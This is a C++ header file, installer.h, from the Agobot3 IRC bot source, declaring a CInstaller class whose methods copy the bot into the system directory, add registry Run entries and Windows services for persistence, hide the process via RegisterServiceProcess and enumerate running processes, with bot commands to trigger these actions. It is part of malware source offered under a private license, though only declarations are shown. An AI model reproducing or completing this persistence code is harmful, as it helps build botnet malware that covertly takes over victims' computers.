/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __INSTALLER_H__
#define __INSTALLER_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"

#ifdef WIN32
// kernel32.dll typedefs/structs
/*
typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32, *LPPROCESSENTRY32;
*/

typedef int (__stdcall *RSP)(DWORD, DWORD);
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);

extern RSP fRegisterServiceProcess;
extern CT32S fCreateToolhelp32Snapshot;
extern P32F fProcess32First;
extern P32N fProcess32Next;

extern HANDLE psnap;
extern PROCESSENTRY32 pe32;
#endif

class CInstaller : public CCommandHandler
{
public:
	bool Init();
	bool CopyToSysDir(CString &sFilename);
	bool Install();
	bool Uninstall();
#ifdef WIN32
	bool RegStartAdd(CString &sValuename, CString &sFilename);
	bool RegStartDel(CString &sValuename);

	bool ServiceAdd(CString &sServicename, CString &sFilename);
	bool ServiceAddInt(CString &sServicename, CString &sFilename, CString &sParams);

	bool IsInstalled(CString &sServicename);
	bool ServiceStart(CString &sServicename);
#endif // WIN32
	CString m_sSysDir;

	bool HandleCommand(CMessage *pMsg);

#ifdef WIN32
	CommandInfo	m_cmdAsAdd, m_cmdAsDel,
			m_cmdSvcAdd, m_cmdSvcDel, m_cmdFileDel;
#endif // WIN32
};

#endif // __INSTALLER_H__
